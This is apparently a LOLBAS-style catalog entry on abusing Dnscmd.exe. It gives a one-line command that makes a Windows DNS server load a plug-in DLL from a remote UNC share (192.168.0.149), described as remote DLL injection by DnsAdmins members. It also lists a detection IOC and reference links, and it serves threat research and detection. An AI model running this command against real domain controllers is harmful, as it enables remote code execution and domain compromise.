---
Name: Dnscmd.exe
Description: A command-line interface for managing DNS servers
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
    Description: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.
    Usecase: Remotely inject dll to dns server
    Category: Execute
    Privileges: DNS admin
    MitreID: T1543.003
    OperatingSystem: Windows server
Full_Path:
  - Path: C:\Windows\System32\Dnscmd.exe
  - Path: C:\Windows\SysWOW64\Dnscmd.exe
Code_Sample:
- Code:
Detection:
 - IOC: Dnscmd.exe loading dll from UNC path
Resources:
  - Link: https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
  - Link: https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
  - Link: https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp
  - Link: https://twitter.com/Hexacorn/status/994000792628719618
  - Link: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
Acknowledgement:
  - Person: Shay Ber
    Handle:
  - Person: Dimitrios Slamaris
    Handle: '@dim0x69'
  - Person: Nikhil SamratAshok
    Handle: '@nikhil_mitt'
---
